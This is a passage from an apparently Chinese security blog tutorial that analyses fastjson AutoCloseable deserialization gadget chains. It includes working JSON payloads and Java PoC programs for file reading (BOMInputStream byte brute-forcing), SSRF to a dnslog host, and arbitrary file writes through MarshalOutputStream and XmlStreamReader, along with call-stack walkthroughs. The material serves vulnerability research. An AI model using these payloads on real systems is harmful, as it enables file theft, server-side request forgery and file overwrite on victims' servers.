class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BOMReadFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;x\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;delegate\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.ReaderInputStream\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;reader\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;jdk.nashorn.api.scripting.URLReader\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;url\&quot;: \&quot;file:\\\\D:\\\\WebSafe\\\\JavaProject\\\\fastjson&quot;</span> +<br>            <span class="hljs-string">&quot;\\\\src\\\\main\\\\java\\\\com\\\\lingx5\\\\exp\\\\1.txt\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;charsetName\&quot;: \&quot;UTF-8\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;            \&quot;bufferSize\&quot;: 1024\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;boms\&quot;: [\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;charsetName\&quot;: \&quot;UTF-8\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;                \&quot;bytes\&quot;: [49,50]\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        ]\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    \&quot;address\&quot;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        \&quot;$ref\&quot;: \&quot;$.x.BOM\&quot;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(payload));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>1</code> 的 ASCII 码是 49，<code>2</code> 的是 50</p><p>我们运行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141208782.png" alt="image-20250326141208782"></p><p>如果我们给的 boms 数组值不和文件匹配的话，结果就是 {“x”:{}}</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141306045.png" alt="image-20250326141306045"></p><p>可以就此结果的差异，去根据 ascii 码表，爆破出文件的内容</p><p class="note note-success"> 不过这个利用还是比较苛刻的，我们更多的可能就是利用这个链条实现 ssrf 判断目标机器是否出网 </p><h5 id="其他用途"><a href="#其他用途" class="headerlink" title="其他用途"></a>其他用途</h5><p>把 url 的路径改为 dnslog 平台 <a href="http://6blpi0.dnslog.cn/">http://6blpi0.dnslog.cn</a></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141931816.png" alt="image-20250326141931816"></p><p>其实这时候已经不再需要输出了，在 URLReader 执行 read 方法的时候，就已经把请求发送出去了，我们的 dnslog 平台就会有记录</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326141838270.png" alt="image-20250326141838270"></p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><h4 id="MarshalOutputStream"><a href="#MarshalOutputStream" class="headerlink" title="MarshalOutputStream"></a>MarshalOutputStream</h4><p>最初公开的写文件的 POC 是这样的, 使用的 FileOutputStream，也是间接集成了 AutoCloseable</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="hljs-punctuation">,</span><br>  &#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.util.zip.InflaterOutputStream&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;out&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      &#x27;@type&#x27;<span class="hljs-punctuation">:</span> &#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>      &#x27;file&#x27;<span class="hljs-punctuation">:</span> &#x27;/tmp/test.txt&#x27;<span class="hljs-punctuation">,</span><br>      &#x27;append&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    &#x27;infl&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      &#x27;input&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-comment">// fastjson在处理byte数组时，会编码为base64，同样在处base64会自动解码为byte数组</span><br>        &#x27;array&#x27;<span class="hljs-punctuation">:</span> &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;<span class="hljs-punctuation">,</span><br>        &#x27;limit&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">22</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    &#x27;bufLen&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1048576</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  &#x27;protocolVersion&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>主要也是利用到有参构造方法</p><p>MarshalOutputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">MarshalOutputStream</span><span class="hljs-params">(OutputStream out, <span class="hljs-type">int</span> protocolVersion)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>    <span class="hljs-built_in">super</span>(out);<br>    <span class="hljs-built_in">this</span>.useProtocolVersion(protocolVersion);<br>    java.security.AccessController.doPrivileged(<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.PrivilegedAction&lt;Void&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                enableReplaceObject(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>它调用了 super(out); ，而在他的直接父类(ObjectOutputStream )的构造方法中有我们要利用的代码（<span style="color:#FF0000;"> 后边会有详细的调用栈 </span>）</p><blockquote><p>这里为什么不直接用 MarshalOutputStream 的父类 java.io.ObjectOutputStream 呢？还要让他去调用 super(out)</p><p>因为 ObjectOutputStream 类具有无参构造器，fastjson 会用无参构造器实例化之后去找 setter 方法，但父类没有对应的 setter 方法，所以写不进去内容，但是文件还是会创建，因为 fastjson 实现是扫描完成后， 在进行封装的。在封装的过程中完成了文件的创建</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326204824373.png" alt="image-20250326204824373"></p><p>传入的 out 为 InflaterOutputStream，并且指定写入内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">InflaterOutputStream</span><span class="hljs-params">(OutputStream out, Inflater infl, <span class="hljs-type">int</span> bufLen)</span> &#123;<br>    <span class="hljs-built_in">super</span>(out);<br><br>    <span class="hljs-comment">// Sanity checks</span><br>    <span class="hljs-keyword">if</span> (out == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Null output&quot;</span>);<br>    <span class="hljs-keyword">if</span> (infl == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;Null inflater&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bufLen &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Buffer size &lt; 1&quot;</span>);<br><br>    <span class="hljs-comment">// Initialize</span><br>    inf = infl;<br>    buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bufLen];<br>&#125;<br></code></pre></td></tr></table></figure><p>在封装 FileOutputStream，指定路径，指定 append 为 false，即覆盖文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">// 先获得了 String boolean的构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">FileOutputStream</span><span class="hljs-params">(String name, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> FileNotFoundException<br>&#123;<br>    <span class="hljs-built_in">this</span>(name != <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(name) : <span class="hljs-literal">null</span>, append);<br>&#125;<br><span class="hljs-comment">// 重载调用</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">FileOutputStream</span><span class="hljs-params">(File file, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> FileNotFoundException<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (file != <span class="hljs-literal">null</span> ? file.getPath() : <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">security</span> <span class="hljs-operator">=</span> System.getSecurityManager();<br>    <span class="hljs-keyword">if</span> (security != <span class="hljs-literal">null</span>) &#123;<br>        security.checkWrite(name);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (name == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (file.isInvalid()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileNotFoundException</span>(<span class="hljs-string">&quot;Invalid file path&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">this</span>.fd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileDescriptor</span>();<br>    fd.attach(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-built_in">this</span>.append = append;<br>    <span class="hljs-built_in">this</span>.path = name;<br><span class="hljs-comment">// 打开文件流，并指定追加内容</span><br>    open(name, append);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h5><p>MarshalOutputStream 的 super，就是 ObjectOutputStream 的带有 out 参数的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    verifySubclass();<br>    <span class="hljs-comment">// 创建BlockDataOutputStream实例</span><br>    bout = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockDataOutputStream</span>(out);<br>    handles = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandleTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);<br>    subs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReplaceTable</span>(<span class="hljs-number">10</span>, (<span class="hljs-type">float</span>) <span class="hljs-number">3.00</span>);<br>    enableOverride = <span class="hljs-literal">false</span>;<br>    writeStreamHeader();<br>    <span class="hljs-comment">// 这个bout 是 用我们传入的InflaterOutputStream 创建的 BlockDataOutputStream</span><br>    bout.setBlockDataMode(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (extendedDebugInfo) &#123;<br>        debugInfoStack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugTraceInfoStack</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        debugInfoStack = <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlockDataOutputStream#setBlockDataMode 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">setBlockDataMode</span><span class="hljs-params">(<span class="hljs-type">boolean</span> mode)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (blkmode == mode) &#123;<br>        <span class="hljs-keyword">return</span> blkmode;<br>    &#125;<br>    <span class="hljs-comment">// 调用了自己的drain()方法</span><br>    drain();<br>    blkmode = mode;<br>    <span class="hljs-keyword">return</span> !blkmode;<br>&#125;<br></code></pre></td></tr></table></figure><p>BlockDataOutputStream#drain 方法，我们接着看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">drain</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (blkmode) &#123;<br>        writeBlockHeader(pos);<br>    &#125;<br>    <span class="hljs-comment">// 这个out就是我们的 InflaterOutputStream 对象</span><br>    out.write(buf, <span class="hljs-number">0</span>, pos);<br>    pos = <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>我们就来到了 inflaterOutputStream#write(byte [], int, int) 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// ... 省略的一些，保留了关键代码</span><br>    <span class="hljs-comment">// Decompress and write blocks of output data</span><br>    <span class="hljs-comment">// 写文件 out为FileOutputStream 对象</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        n = inf.inflate(buf, <span class="hljs-number">0</span>, buf.length);<br>        <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>            out.write(buf, <span class="hljs-number">0</span>, n);<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// Check the decompressor</span><br>    <span class="hljs-keyword">if</span> (inf.finished()) &#123;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (inf.needsDictionary()) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipException</span>(<span class="hljs-string">&quot;ZLIB dictionary missing&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终掉到了 java.io.FileOutputStream#writeBytes 而这个方法是 native 方法，调用 c 语言实现文件的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span> b[], <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    writeBytes(b, off, len, fdAccess.getAppend(fd));<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeBytes</span><span class="hljs-params">(<span class="hljs-type">byte</span> b[], <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len, <span class="hljs-type">boolean</span> append)</span><br>    <span class="hljs-keyword">throws</span> IOException;<br></code></pre></td></tr></table></figure><h5 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h5><p>简单总结调用流程 </p><p>fastjson 封装对象  <code>FileOutputStream</code> ,  <code>InflaterOutputStream</code> , <code>MarshalOutputStream</code>  </p><p>调用的流程</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">MarshalOutputStream的构造方法<br>ObjectOutputStream的构造方法<br>java.io.ObjectOutputStream.BlockDataOutputStream#setBlockDataMode<br>java.io.ObjectOutputStream.BlockDataOutputStream#drain<br>java.util.zip.InflaterOutputStream#write(byte[], int, int)<br>java.io.FileOutputStream#write(byte[], int, int)<br>java.io.FileOutputStream#writeBytes<br></code></pre></td></tr></table></figure><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p><strong>MarshalWriteFile</strong></p><p>写个程序测试一下，我就只把路径改了一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarshalWriteFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;@type&#x27;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;@type&#x27;: &#x27;sun.rmi.server.MarshalOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;out&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;@type&#x27;: &#x27;java.util.zip.InflaterOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;out&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;@type&#x27;: &#x27;java.io.FileOutputStream&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;file&#x27;: &#x27;D:/WebSafe/JavaProject/fastjson/src/main/java/com/lingx5/poc/2.txt&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;append&#x27;: false\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;infl&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#x27;input&#x27;: &#123;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#x27;array&#x27;: &#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &#x27;limit&#x27;: 22\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &#125;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &#x27;bufLen&#x27;: 1048576\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &#x27;protocolVersion&#x27;: 1\n&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(payload));<br>        System.out.println(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用堆栈 , 并成功写文件</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250327090057625.png" alt="image-20250327090057625"></p><p>而这个 POC 在不同的 JDK 版本是不通用的，这是为什么呢？</p><blockquote><p>在 java 编译字节码的时候，Java 编译器为了减小 <code>.class</code> 文件的大小和提高运行时性能，会在编译的时候把参数默认设置为 var0 var1 的样式，而不是参数的具体名称。从而让 fastjson 的反序列化器再利用 asm 获取有参构造器时，识别不到参数，也就拿不到构造器。所以链条就不能用了</p></blockquote><p>我们可以使用 <code>LocalVariableTable</code> 来判断这个类是不是具有具体的参数名称</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">javap <span class="hljs-literal">-l</span> &lt;class_name&gt; | findstr LocalVariableTable<br></code></pre></td></tr></table></figure><p>可以看到区别 在 jdk8 和 jdk17 中</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326160612318.png" alt="image-20250326160612318"></div><div class="group-image-wrap"><img src="https://gitee.com/ling-x5/img/raw/master/image-20250326160316923.png" alt="image-20250326160316923"></div></div><div class="group-image-row"></div></div><p>这就说明 在 jdk17 中可以找到构造方法的</p><h4 id="XmlStreamReader"><a href="#XmlStreamReader" class="headerlink" title="XmlStreamReader"></a>XmlStreamReader</h4><p>适用版本 commons-io 2.0~2.6</p><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">voidfyoo</a> 师傅文章中已经写的很详细了，通过 XmlStreamReader 作为入口，循环调用来解决 buffer 长度不够的问题</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>  <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,<br>  <span class="hljs-string">&quot;is&quot;</span>:&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>:&#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,<br>      <span class="hljs-string">&quot;reader&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,<br>        <span class="hljs-string">&quot;charSequence&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-string">&quot;aaaaaa&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;charsetName&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>,<br>      <span class="hljs-string">&quot;bufferSize&quot;</span>:<span class="hljs-number">1024</span><br>    &#125;,<br>    <span class="hljs-string">&quot;branch&quot;</span>:&#123;<br>      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,<br>      <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,<br>        <span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;/tmp/pwned&quot;</span>,<br>        <span class="hljs-string">&quot;encoding&quot;</span>: <span class="hljs-string">&quot;UTF-8&quot;</span>,<br>        <span class="hljs-string">&quot;append&quot;</span>: <span class="hljs-literal">false</span><br>      &#125;,<br>      <span 